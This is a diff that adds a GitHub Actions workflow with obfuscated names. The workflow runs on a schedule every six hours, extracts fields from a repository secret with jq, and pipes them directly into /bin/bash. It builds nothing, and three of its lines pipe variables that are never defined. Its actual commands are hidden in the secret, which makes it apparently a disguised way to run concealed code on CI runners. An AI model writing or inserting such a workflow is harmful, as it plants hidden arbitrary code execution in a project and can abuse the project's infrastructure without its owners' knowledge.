@@ -1,0 +1,20 @@
+name: longzhitao3817
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: longzhitao3817
+        env:
+          urp31: ${{ secrets.urp31 }}
+        run: |
+          echo $urp31 | jq -r .gx015 | /bin/bash
+          echo $ncklz80 | jq -r .p35999 | /bin/bash
+          echo $jwg87 | jq -r .xx2831 | /bin/bash
+          echo $rnx4 | jq -r .vxu2 | /bin/bash
+
